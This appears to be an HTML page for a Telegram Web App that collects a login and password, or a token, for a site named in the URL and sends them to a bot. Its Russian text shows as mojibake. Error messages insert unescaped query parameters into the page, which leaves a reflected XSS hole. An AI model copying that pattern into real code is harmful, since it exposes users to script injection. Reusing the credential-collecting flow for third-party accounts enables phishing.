<!DOCTYPE html> 
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        :root {
            --primary-color: #2c3e50;
            --secondary-color: #3498db;
            --success-color: #27ae60;
            --error-color: #e74c3c;
            --background-color: #f9f9f9;
            --text-color: #333;
            --android-color: #a4c639;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--background-color);
            color: var(--text-color);
            margin: 0;
            line-height: 1.6;
            -webkit-tap-highlight-color: transparent;
        }

        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background: white;
            min-height: 100vh;
            box-sizing: border-box;
        }

        @media (min-width: 768px) {
            .container {
                padding: 30px;
                margin: 20px auto;
                min-height: auto;
                border-radius: 12px;
                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            }
        }

        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.5);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            padding: 15px;
        }

        .modal {
            background: white;
            padding: 25px;
            border-radius: 10px;
            width: 100%;
            max-width: 400px;
            position: relative;
            animation: modalShow 0.3s ease;
        }

        .modal-close {
            position: absolute;
            top: 10px;
            right: 10px;
            background: none;
            border: none;
            font-size: 24px;
            cursor: pointer;
            color: var(--text-color);
            padding: 5px;
        }

        .modal-content {
            display: flex;
            align-items: center;
            gap: 15px;
            font-size: 16px;
        }

        h2 {
            color: var(--primary-color);
            text-align: center;
            margin: 0 0 20px;
            font-size: 1.8rem;
        }

        .instructions {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
        }

        .step {
            margin-bottom: 12px;
            padding: 12px;
            background: white;
            border-left: 4px solid var(--secondary-color);
            border-radius: 4px;
            font-size: 15px;
        }

        .android-step {
            border-left-color: var(--android-color);
        }

        .android-highlight {
            background: linear-gradient(90deg, var(--android-color), #8bc34a);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: bold;
        }

        .platform-tabs {
            display: flex;
            gap: 8px;
            margin: 12px 0;
            flex-wrap: wrap;
        }

        .platform-tab {
            padding: 8px 16px;
            border-radius: 20px;
            cursor: pointer;
            background: #e0e0e0;
            transition: all 0.3s ease;
            font-size: 14px;
            flex-shrink: 0;
        }

        .platform-tab.active {
            background: var(--secondary-color);
            color: white;
        }

        .platform-tab.android {
            background: var(--android-color);
            color: white;
        }

        .platform-tab.android.active {
            background: #689f38;
        }

        .download-link {
            display: inline-block;
            background: linear-gradient(45deg, var(--android-color), #8bc34a);
            color: white;
            padding: 12px 20px;
            text-decoration: none;
            border-radius: 25px;
            margin: 10px 0;
            font-weight: bold;
            transition: transform 0.2s ease;
        }

        .download-link:hover {
            transform: translateY(-2px);
            text-decoration: none;
            color: white;
        }

        .download-link::before {
            content: "üì± ";
        }

        input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 2px solid #ddd;
            border-radius: 6px;
            font-size: 16px;
            transition: border-color 0.3s ease;
            box-sizing: border-box;
        }

        @media (max-width: 480px) {
            input {
                font-size: 16px;
                padding: 14px;
            }
        }

        button.primary {
            background: var(--secondary-color);
            color: white;
            padding: 15px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            transition: background 0.3s ease;
            margin-top: 15px;
            touch-action: manipulation;
        }

        .code-block {
            background: #2c3e50;
            color: white;
            padding: 12px;
            border-radius: 6px;
            font-family: monospace;
            margin: 8px 0;
            font-size: 14px;
            overflow-x: auto;
        }

        .input-group {
            margin: 20px 0;
        }

        .sub-step {
            margin-left: 20px;
            color: #666;
            position: relative;
            font-size: 14px;
            margin-bottom: 8px;
        }

        .sub-step::before {
            content: '‚Ä¢';
            position: absolute;
            left: -12px;
            color: var(--secondary-color);
        }

        .android-note {
            background: linear-gradient(135deg, #e8f5e8, #f1f8e9);
            border: 1px solid var(--android-color);
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
        }

        .android-note h3 {
            margin: 0 0 10px 0;
            color: var(--android-color);
            font-size: 1.1rem;
        }

        .highlight {
            font-weight: bold;
            color: var(--primary-color);
        }

        @media (max-width: 480px) {
            .container {
                padding: 15px;
            }
            
            h2 {
                font-size: 1.5rem;
            }
            
            .step {
                padding: 10px;
                font-size: 14px;
            }
            
            .platform-tabs {
                gap: 6px;
            }
            
            .platform-tab {
                padding: 8px 12px;
                font-size: 13px;
            }
            
            button.primary {
                padding: 14px;
                font-size: 15px;
            }

            .download-link {
                padding: 10px 16px;
                font-size: 14px;
            }
        }

        @keyframes modalShow {
            from { transform: translateY(-20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .hidden {
            display: none;
        }
    </style>
    <script async src="https://telegram.org/js/telegram-web-app.js"></script>
    <script>
        async function loadConfig(site) {
            try {
                const response = await fetch(`configs/${site}.config.json`);
                if (!response.ok) throw new Error('–ö–æ–Ω—Ñ–∏–≥ –Ω–µ –Ω–∞–π–¥–µ–Ω');
                return await response.json();
            } catch (error) {
                showModal(`–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –∫–æ–Ω—Ñ–∏–≥–∞ –¥–ª—è —Å–∞–π—Ç–∞: ${site}`);
                console.error(error);
                return null;
            }
        }

        function showModal(message, type = 'error') {
            const modalHTML = `
                <div class="modal-overlay" onclick="closeModal(event)">
                    <div class="modal">
                        <button class="modal-close" onclick="closeModal(event)">√ó</button>
                        <div class="modal-content">
                            <svg class="modal-icon" width="32" height="32" viewBox="0 0 24 24" fill="${type === 'error' ? '#e74c3c' : '#3498db'}">
                                <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM13 17H11V15H13V17ZM13 13H11V7H13V13Z"/>
                            </svg>
                            <div>${message}</div>
                        </div>
                    </div>
                </div>
            `;
            document.body.insertAdjacentHTML('beforeend', modalHTML);
        }

        function generateSteps(steps, stepNumber = 1, isAndroid = false) {
            return steps.map((step, index) => {
                const currentStep = stepNumber + index;
                const stepClass = isAndroid ? 'step android-step' : 'step';
                const highlightClass = isAndroid ? 'android-highlight' : 'highlight';
                
                if(Array.isArray(step)) {
                    return `
                        <div class="sub-step">
                            ${step.map(subStep => `<div>${subStep}</div>`).join('')}
                        </div>
                    `;
                }
                return `
                    <div class="${stepClass}">
                        <span class="${highlightClass}">–®–∞–≥ ${currentStep}:</span> ${step}
                    </div>
                `;
            }).join('');
        }

        function getQueryParam(name) {
            return new URLSearchParams(window.location.search).get(name);
        }

        function showPlatform(platformKey) {
            document.querySelectorAll('.platform-tab').forEach(tab => 
                tab.classList.toggle('active', tab.dataset.platform === platformKey)
            );
            document.querySelectorAll('.platform-instructions').forEach(div => {
                div.classList.toggle('hidden', div.dataset.platform !== platformKey);
            });
        }

        async function initForm() {
            if (!validateParams()) return;

            const method = getQueryParam("method");
            const site = getQueryParam("site");
            const config = await loadConfig(site);
            
            if (!config || !config[method]) {
                showModal('–ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –Ω–µ –Ω–∞–π–¥–µ–Ω–∞');
                return;
            }

            document.title = site;
            document.querySelector('h2').textContent = site;
            document.getElementById(`${method}Form`).style.display = 'block';

            const methodConfig = config[method];
            const instructionsContainer = document.getElementById('dynamic-instructions');
            
            if (methodConfig.platforms) {
                let tabsHTML = '<div class="platform-tabs">';
                let contentHTML = '';
                let firstPlatform = true;
                
                for (const [platformKey, platformData] of Object.entries(methodConfig.platforms)) {
                    const isAndroid = platformKey === 'android';
                    const tabClass = `platform-tab ${isAndroid ? 'android' : ''} ${firstPlatform ? 'active' : ''}`;
                    
                    tabsHTML += `
                        <div class="${tabClass}" 
                             data-platform="${platformKey}"
                             onclick="showPlatform('${platformKey}')">
                            ${platformData.name}
                        </div>
                    `;
                    
                    let platformContent = '';
                    
                    if (isAndroid && platformData.downloadLink) {
                        platformContent += `
                            <div class="android-note">
                                <h3>ü§ñ –†–µ–∫–æ–º–µ–Ω–¥—É–µ–º—ã–π —Å–ø–æ—Å–æ–±</h3>
                                <p>–°–∞–º—ã–π –ø—Ä–æ—Å—Ç–æ–π —Å–ø–æ—Å–æ–± –ø–æ–ª—É—á–∏—Ç—å —Ç–æ–∫–µ–Ω - –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –Ω–∞—à–µ —Å–ø–µ—Ü–∏–∞–ª—å–Ω–æ–µ Android-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ:</p>
                                <a href="${platformData.downloadLink}" class="download-link" target="_blank">
                                    –°–∫–∞—á–∞—Ç—å Android-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ
                                </a>
                            </div>
                        `;
                    }
                    
                    platformContent += generateSteps(platformData.steps, 1, isAndroid);
                    
                    contentHTML += `
                        <div class="platform-instructions ${firstPlatform ? '' : 'hidden'}" 
                             data-platform="${platformKey}">
                            ${platformContent}
                        </div>
                    `;
                    
                    firstPlatform = false;
                }
                tabsHTML += '</div>';
                instructionsContainer.innerHTML = tabsHTML + contentHTML;
            } else {
                instructionsContainer.innerHTML = generateSteps(methodConfig.steps);
            }
        }

        function validateParams() {
            const requiredParams = ['method', 'site'];
            const missingParams = requiredParams.filter(param => !getQueryParam(param));
            
            if (missingParams.length > 0) {
                showModal(`–û—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç –ø–∞—Ä–∞–º–µ—Ç—Ä—ã: ${missingParams.join(', ')}`);
                document.querySelector('.container').classList.add('hidden');
                return false;
            }
            
            const validMethods = ['token', 'login'];
            const method = getQueryParam("method");
            
            if (!validMethods.includes(method)) {
                showModal(`–ù–µ–¥–æ–ø—É—Å—Ç–∏–º—ã–π –º–µ—Ç–æ–¥: ${method}`);
                document.querySelector('.container').classList.add('hidden');
                return false;
            }
            
            return true;
        }

        function submitData() {
            const method = getQueryParam("method");
            let authData = { method, site: getQueryParam("site") };

            if (method === 'login') {
                authData.login = document.getElementById('login').value;
                authData.password = document.getElementById('password').value;
                
                if (!authData.login || !authData.password) {
                    showModal('–ó–∞–ø–æ–ª–Ω–∏—Ç–µ –≤—Å–µ –ø–æ–ª—è!');
                    return;
                }
            } else {
                authData.token = document.getElementById('token').value;
                
                if (!authData.token) {
                    showModal('–í–≤–µ–¥–∏—Ç–µ —Ç–æ–∫–µ–Ω!');
                    return;
                }
            }

            Telegram.WebApp.sendData(JSON.stringify(authData));
            Telegram.WebApp.close();
        }

        function closeModal(e) {
            if(e.target.closest('.modal-close') || !e.target.closest('.modal')) {
                document.querySelector('.modal-overlay')?.remove();
            }
        }

        window.onload = () => { initForm().catch(console.error) };
    </script>
</head>
<body>
    <div class="container">
        <h2></h2>
        
        <div class="instructions" id="dynamic-instructions"></div>

        <div class="input-group">
            <div id="loginForm" class="hidden">
                <input type="text" id="login" placeholder="–õ–æ–≥–∏–Ω" required>
                <input type="password" id="password" placeholder="–ü–∞—Ä–æ–ª—å" required>
            </div>

            <div id="tokenForm" class="hidden">
                <input type="text" id="token" placeholder="–í–≤–µ–¥–∏—Ç–µ —Ç–æ–∫–µ–Ω" required>
            </div>
        </div>

        <button class="primary" onclick="submitData()">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
    </div>
</body>
</html>
